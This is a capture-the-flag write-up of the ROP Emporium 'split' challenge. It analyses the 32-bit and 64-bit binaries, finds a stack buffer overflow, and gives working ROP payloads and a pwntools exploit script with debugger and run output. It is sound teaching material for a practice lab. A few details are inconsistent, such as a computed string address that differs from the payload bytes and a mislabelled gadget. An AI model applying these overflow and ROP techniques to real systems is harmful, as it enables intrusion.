# ROP Emporium - split

Write up della challenge **split** di **ROP emporium** delle versioni **x86** e **x86-64**.

- [Challenge Information](#challenge-information)
- [Binary Analysis - x86](#binary-analysis---x86)
- [Capture The Flag - x86](#capture-the-flag---x86)
- [Binary Analysis - x86 64](#binary-analysis-x86-64)
- [Capture The Flag - x86 64](#capture-the-flag-x86-64)

## Challenge Information

**Challenge link:** [https://ropemporium.com/challenge/split.html](https://ropemporium.com/challenge/split.html)

```text
The elements that allowed you to complete ret2win are still present, they've just been split apart.

Find them and recombine them using a short ROP chain.
```

## Binary Analysis - x86

```bash
$ ls
flag.txt  split32

$ file split32 
split32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=76cb700a2ac0484fb4fa83171a17689b37b9ee8d, not stripped

$ checksec --file=split32
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

```

Since the binary is **not stripped**, we can identify the available symbols:

`radare`
```bash
$ r2 split32
[0x08048430]> aaaa

[0x08048430]> afl
0x080483b0    1      6 sym.imp.read
0x080483c0    1      6 sym.imp.printf
0x080483d0    1      6 sym.imp.puts
0x080483e0    1      6 sym.imp.system
0x080483f0    1      6 sym.imp.__libc_start_main
0x08048400    1      6 sym.imp.setvbuf
0x08048410    1      6 sym.imp.memset
0x08048430    1     50 entry0
0x08048463    1      4 fcn.08048463
0x08048490    4     41 sym.deregister_tm_clones
0x080484d0    4     54 sym.register_tm_clones
0x08048510    3     31 entry.fini0
0x08048540    1      6 entry.init0
0x080485ad    1     95 sym.pwnme
0x0804860c    1     25 sym.usefulFunction
0x08048690    1      2 sym.__libc_csu_fini
0x08048480    1      4 sym.__x86.get_pc_thunk.bx
0x08048694    1     20 sym._fini
0x08048630    4     93 sym.__libc_csu_init
0x08048470    1      2 sym._dl_relocate_static_pie
0x08048546    1    103 main
0x08048374    3     35 sym._init
0x08048420    1      6 loc.imp.__gmon_start__
```

Among them we identify `main`, `pwnme`, and `usefulFunction`.

Because the binary is **NO PIE**, function addresses are static and do not change at runtime.

Therefore, we note the memory addresses of the relevant functions:

```bash
$ readelf --syms split32 | grep -E "(main|pwnme|usefulFunction)$"
    36: 080485ad    95 FUNC    LOCAL  DEFAULT   14 pwnme
    37: 0804860c    25 FUNC    LOCAL  DEFAULT   14 usefulFunction
    70: 08048546   103 FUNC    GLOBAL DEFAULT   14 main
```

So:

* `main`: 0x8048546
* `pwnme`: 0x80485ad
* `usefulFunction`: 0x804860c

To understand how the program works, we decompile it using **Ghidra** before running it.

Decompiled code analysis of the `main` function:

```c
undefined4 main(void) {
  setvbuf(stdout,(char *)0x0,2,0);
  puts("split by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

The *main* function calls `pwnme`.

Decompiled code analysis of the `pwnme` function:

```c
void pwnme(void) {
  undefined1 buf [40];
  
  memset(buf,0,32);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  read(0,buf,96);
  puts("Thank you!");
  return;
}

```

The *pwnme* function defines a stack variable *buf* of 40 elements. It then zeroes the first 32 bytes using `memset`, prints various messages to STDOUT, and calls `read` to read 96 bytes into *buf*.

The vulnerability lies in the *read* function, which allows writing more data onto the stack than *buf* can hold.

\[+] `pwnme`: **Buffer overflow vulnerability**.

It is possible to write exactly `96-40 = 56` extra bytes on the stack.

Decompiled code analysis of the `ret2win` function:

```c
void usefulFunction(void)

{
  system("/bin/ls");
  return;
}
```

This function lists the contents of current directory, but it is not called anywhere in the program, and even more importantly do not print the contents of `flag.txt`!

The idea is to exploit the buffer overflow vulnerability to overwrite the EIP saved in the *pwnme* stack frame with the address of the `call system` instruction invoked in the `usefulFunction`, passing it the command `/bin/cat flag.txt` as a parameter.

Remember that in the x86 convention for passing parameters to a function, they are allocated immediately before the `return address`.

Use **GDB** to figure out how far down the stack the `saved eip` is.

```bash
$ gdb-pwndbg 
pwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
------- tip of the day (disable with set show-tips off) -------
Need to mmap or mprotect memory in the debugee? Use commands with the same name to inject and run such syscalls
pwndbg> file split32 
Reading symbols from split32...
(No debugging symbols found in split32)
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

pwndbg> r                                                                                                                                                                                                                                                                               
Starting program: /home/ap/Desktop/rop_emporium/split/x86/split32                                                                                                                                                                                                                                           
split by ROP Emporium                                                                                             
x86     

Contriving a reason to ask user for data...          
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa     

Thank you! 

Program received signal SIGSEGV, Segmentation fault. 
...

pwndbg> info registers
eax            0xb                 11
ecx            0xf7fa49b4          -134592076
edx            0x1                 1
ebx            0xf7fa3000          -134598656
esp            0xffffd010          0xffffd010
ebp            0x6161616b          0x6161616b
esi            0xffffd0e4          -12060
edi            0xf7ffcb80          -134231168
eip            0x6161616c          0x6161616c
eflags         0x10282             [ SF IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99

pwndbg> cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

## Capture The Flag - x86

The attack plan is to build a `payload` that overwrites the *saved eip* of *pwnme*:

* **PADDING** of 44 bytes.
* **call system ADDRESS** of 4 bytes.
* **/bin/cat flag.txt ADDRESS**.

This should allow us to invoke the `system` function wiht the desired command.

Let's check if the string of interest is present in the binary:

```bash
$ strings -t x split32 | grep cat 
   1030 /bin/cat flag.txt

$ python3 -c 'print(hex(0x8048000 + 0x1030))'   # executable base address + offset
0x8049030
```

It also gets the memory address of the `call system` instruction defined in `usefulFunction`:

```bash
[0x0804a030]> s sym.usefulFunction 
[0x0804860c]> pdfr
┌ 25: sym.usefulFunction ();
│ 0x0804860c      55             push ebp
│ 0x0804860d      89e5           mov ebp, esp
│ 0x0804860f      83ec08         sub esp, 8
│ 0x08048612      83ec0c         sub esp, 0xc
│ 0x08048615      680e870408     push str._bin_ls                      ; 0x804870e ; "/bin/ls"
│ 0x0804861a      e8c1fdffff     call sym.imp.system                   ; int system(const char *string)
│ 0x0804861f      83c410         add esp, 0x10
│ 0x08048622      90             nop
│ 0x08048623      c9             leave
└ 0x08048624      c3             ret

```

- `call system`: 0x804861a
- `/bin/cat flag.txt`: 0x8049030

Crafting and passing the *payload* as input to the program:

```bash
$ # payload = PADDING + call system addr + /bin/cat flag.txt addr (little-endianess)
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x1a\x86\x04\x08" + b"\x30\xa0\x04\x08")' | ./split32
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped 
```

It works!

## Binary Analysis x86-64

The considerations made previously with the **32-bit** version are also valid for the **64-bit** version.

The difference is in the passage of the command `/bin/cat flag.txt` to the function `system`.

Remember that in the x86-64 architecture the passing of parameters to a function is done via **registers** (and also via stack if the number of registers used for the passage of parameters is not sufficient).

In our case, the parameter must be passed via the **RDI** register.

So the idea is to:

1. determine the distance in bytes from the top of the stack to the **saved rip**.
2. look for the **gadget** `pop rdi; ret` to load the content allocated at the top of the stack into the **rdi** register, which will be the command `/bin/cat flag.txt`!

```bash
$ gdb-pwndbg                                                                                                                                                                                                                          [65/65]
pwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.                                                                                                                                                                                                                    
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.                                                                                                                                                                                        
------- tip of the day (disable with set show-tips off) -------                                                                                                                                                                                                                         
Want to display each context panel in a separate tmux window? See https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#splitting--layouting-context                                                                                                                                    
pwndbg> file split                                                                                                                                                                                                                                                                      
Reading symbols from split...                                                                                                                                                                                                                                                           
(No debugging symbols found in split)                                                                                                                                                                                                                                                   
pwndbg> cyclic                                                                                                                                                                                                                                                                          
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa                                                                                                                                                                                    
pwndbg> r 
pwndbg> info registers
rax            0xb                 11
rbx            0x0                 0
rcx            0x7ffff7d14887      140737351075975
rdx            0x1                 1
rsi            0x1                 1
rdi            0x7ffff7e1ca70      140737352157808
rbp            0x6161616161616165  0x6161616161616165
rsp            0x7fffffffde08      0x7fffffffde08
r8             0xa                 10
r9             0x7ffff7fc9040      140737353912384
r10            0x7ffff7c065e8      140737349969384
r11            0x246               582
r12            0x7fffffffdf28      140737488346920
r13            0x400697            4195991
r14            0x0                 0
r15            0x7ffff7ffd040      140737354125376
rip            0x400741            0x400741 <pwnme+89>
eflags         0x10202             [ IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
pwndbg> cyclic -l 0x6161616161616165
Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32

```

Distance from `rbp` equal to `32` bytes, so the distance from `saved rip` will be equal to `32+8 = 40` bytes.

Here are the memory addresses of interest to pass to our **ROP chain**:

* `call system`: 0x40074b
* `/bin/cat flag.txt`: 0x601060

The search for the *gadget* `pop rdi; ret` is done with **Ropper**:

```bash
$ ropper --file split --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret;

```

* `/bin/cat flag.txt`: 0x4007c3

## Capture The flag (x86-64)

The form of the `payload` to be constructed is as follows:

- **PADDING** of 40 bytes.
- **pop rdi; ret ADDR**.
- **/bin/cat flag.txt ADDR**.
- **call system ADDR**.

Below is a *Python* script using the *pwntools* library to generate the *payload* and interact with the vulnerable program.

```python
from pwn import context, ELF, process, flat

exe = './split'
elf = context.binary = ELF(exe, checksec=False)

context.log_level = 'debug'

# Crafting payload
srip_offset = 40
call_system_addr = 0x40074b
pop_rdi_ret_addr = 0x4007c3
bin_cat_flag_addr = 0x601060

padding = "A"*srip_offset

payload = flat(
    padding.encode(),
    pop_rdi_ret_addr,
    bin_cat_flag_addr,
    call_system_addr
)

# Get the flag
io = process([exe])
io.sendline(payload)
data = io.recvall().decode()
data = data.split("Thank you!")

print(data[1])
```

```bash
$ python3 exploit.py 
[+] Starting local process './split': pid 58833
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  c3 07 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  60 10 60 00  00 00 00 00  4b 07 40 00  00 00 00 00  │`·`·│····│K·@·│····│
    00000040  0a                                                  │·│
    00000041
[+] Receiving all data: Done (194B)
[DEBUG] Received 0x57 bytes:
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
    b'> Thank you!\n'
[DEBUG] Received 0x21 bytes:
    b'ROPE{a_placeholder_32byte_flag!}\n'
[DEBUG] Received 0x4a bytes:
    b'split by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Contriving a reason to ask user for data...\n'
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 58833)

ROPE{a_placeholder_32byte_flag!}
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...

```

It works successfully!

---